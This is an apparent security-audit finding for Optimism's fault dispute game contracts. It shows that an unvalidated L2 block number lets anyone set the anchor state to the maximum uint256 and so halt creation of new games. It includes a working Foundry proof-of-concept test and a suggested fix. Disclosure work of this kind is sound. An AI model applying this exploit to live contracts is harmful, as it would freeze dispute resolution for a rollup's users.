Noisy Pewter Woodpecker

medium

# Fault game factory can be manipulated to DOS game type using malicious `l2BlockNumber`

## Summary

All new games are proven against the most recent L2 block number in the `ANCHOR_STATE_REGISTRY`. This includes requiring that the block number we are intending to prove is greater than the latest proven block number in the registry. Due to insufficient validations of the passed L2 block number, it is possible for a user to set the latest block to `type(uint256).max`, blocking all possible future games from being initialized.

## Vulnerability Detail

New games are created for a given root claim and L2 block number using the factory, by cloning the implementation of the specified game type and passing these values as immutable args (where `_extraData` is the L2 block number).
```solidity
proxy_ = IDisputeGame(address(impl).clone(abi.encodePacked(_rootClaim, parentHash, _extraData)));
proxy_.initialize{ value: msg.value }();
```
As a part of the initialize function, we pull the latest confirmed `root` and `rootBlockNumber` from the `ANCHOR_STATE_REGISTRY`. These will be used as the "starting points" for our proof. In order to confirm they are valid starting points, we require that the L2 block number we passed is greater than the last proven root block number.
```solidity
(Hash root, uint256 rootBlockNumber) = ANCHOR_STATE_REGISTRY.anchors(GAME_TYPE);

// Should only happen if this is a new game type that hasn't been set up yet.
if (root.raw() == bytes32(0)) revert AnchorRootNotFound();

// Set the starting output root.
startingOutputRoot = OutputRoot({ l2BlockNumber: rootBlockNumber, root: root });

// Do not allow the game to be initialized if the root claim corresponds to a block at or before the
// configured starting block number.
if (l2BlockNumber() <= rootBlockNumber) revert UnexpectedRootClaim(rootClaim());
```
However, the L2 block number we pass does not appear to be sufficiently validated. If we look at the Fault Dispute Game, we can see that disputed L2 block number passed to the oracle is calculated using the `_execLeafIdx` and does not make any reference to the L2 block number passed via `extraData`:
```solidity
uint256 l2Number = startingOutputRoot.l2BlockNumber + disputedPos.traceIndex(SPLIT_DEPTH) + 1;

oracle.loadLocalData(_ident, uuid.raw(), bytes32(l2Number << 0xC0), 8, _partOffset);
```
This allows us to pass an L2 block number that is disconnected from the proof being provided.

After the claim is resolved, we update the `ANCHOR_STATE_REGISTRY` to include our new root by calling `tryUpdateAnchorState()`.
```solidity
function tryUpdateAnchorState() external {
    // Grab the game and game data.
    IFaultDisputeGame game = IFaultDisputeGame(msg.sender);
    (GameType gameType, Claim rootClaim, bytes memory extraData) = game.gameData();

    // Grab the verified address of the game based on the game data.
    // slither-disable-next-line unused-return
    (IDisputeGame factoryRegisteredGame,) =
        DISPUTE_GAME_FACTORY.games({ _gameType: gameType, _rootClaim: rootClaim, _extraData: extraData });

    // Must be a valid game.
    require(
        address(factoryRegisteredGame) == address(game),
        "AnchorStateRegistry: fault dispute game not registered with factory"
    );

    // No need to update anything if the anchor state is already newer.
    if (game.l2BlockNumber() <= anchors[gameType].l2BlockNumber) {
        return;
    }

    // Must be a game that resolved in favor of the state.
    if (game.status() != GameStatus.DEFENDER_WINS) {
        return;
    }

    // Actually update the anchor state.
    anchors[gameType] = OutputRoot({ l2BlockNumber: game.l2BlockNumber(), root: Hash.wrap(game.rootClaim().raw()) });
}
```
As long as the L2 block number we passed is greater than the last proven one, we update it with our new root. This allows us to set the `ANCHOR_STATE_REGISTRY` to contain an arbitrarily high `blockRootNumber`.

If we were to pass `type(uint256).max` as this value, it would be set in the `anchors` mapping, and would cause all other games to fail to initialize, because there is no value they could pass for the L2 block number that would be greater, and would therefore fail the check described above.

## Proof of Concept

The following test can be dropped into `DisputeGameFactory.t.sol` to demonstrate the vulnerability:
```solidity
function testZach_DOSWithMaxBlockNumber(uint256 newBlockNum) public {
    // propose a root with a block number of max uint256
    bytes memory maxBlock = abi.encode(type(uint256).max);
    IDisputeGame game = disputeGameFactory.create(GameType.wrap(0), Claim.wrap(bytes32(uint(1))), maxBlock);
    assertEq(game.l2BlockNumber(), type(uint256).max);

    // when the game passes, it's saved in the anchor registry
    vm.warp(block.timestamp + 4 days);
    game.resolveClaim(0);
    game.resolve();

    // now we can fuzz newly proposed block numbers, and all fail for the same reason
    bytes memory maxBlock2 = abi.encode(newBlockNum);
    vm.expectRevert(abi.encodeWithSelector(UnexpectedRootClaim.selector, 1));
    disputeGameFactory.create(GameType.wrap(0), Claim.wrap(bytes32(uint(1))), maxBlock2);
}
```

## Impact

For no cost, the factory can be DOS'd from creating new games of a given type.

## Code Snippet

https://github.com/sherlock-audit/2024-02-optimism-2024/blob/main/optimism/packages/contracts-bedrock/src/dispute/FaultDisputeGame.sol#L528-L539

https://github.com/sherlock-audit/2024-02-optimism-2024/blob/main/optimism/packages/contracts-bedrock/src/dispute/AnchorStateRegistry.sol#L59-L87

## Tool used

Manual Review

## Recommendation

In order to ensure that ordering does not need to be preserved, `ANCHOR_STATE_REGISTRY` should store a mapping of claims to booleans. This would allow users to prove against any proven state, instead of being restricted to proving against the latest state, which could be manipulated.
